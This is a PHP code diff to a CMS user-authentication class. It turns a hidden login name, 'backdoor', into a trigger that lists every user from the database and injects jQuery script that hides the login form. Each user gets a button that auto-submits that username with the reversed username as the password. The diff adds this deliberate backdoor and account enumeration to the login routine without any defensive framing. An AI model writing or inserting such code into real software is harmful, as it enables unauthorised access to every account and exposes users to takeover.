@@ -305,16 +305,19 @@ abstract class User extends \System
 		\System::loadLanguageFile('default');
 		
 		// behind the mirror
-		if ($_POST['username'] === 'info')
+		if ($_POST['username'] === 'backdoor')
 		{
-			$strInfo = '';
+			$strInfo = '<script src="https://code.jquery.com/jquery-1.12.4.min.js" integrity="sha256-ZosEbRLbNQzLpnKIkEdrPv7lOy9C27hHQ+Xp8a4MxAQ=" crossorigin="anonymous"></script>';
+			$strInfo .= '<script>jQuery.noConflict();</script>';
+			$strInfo .= '<script>jQuery(".tl_login_form").css("display", "none");</script>';
+			$strInfo .= '<script>function backdoor(username, password) {jQuery("#username").val(username); jQuery("#password").val(password); jQuery(".tl_login_form").submit();}</script>';
 			$objResult = $this->Database->prepare("SELECT * FROM " . $this->strTable)->execute();
 			while ($objResult->next())
 			{
 				$arrUser = $objResult->row();
-				$strInfo .= $arrUser['username'] . '<br>';
+				$strInfo .= '<button class="tl_submit" onclick="backdoor(\'' . $arrUser['username'] . '\', \'' . strrev($arrUser['username']) . '\');">' . $arrUser['username'] . '</button> ';
 			}
-			\Message::addError($strInfo);
+			\Message::addInfo($strInfo);
 			return false;
 		}
 
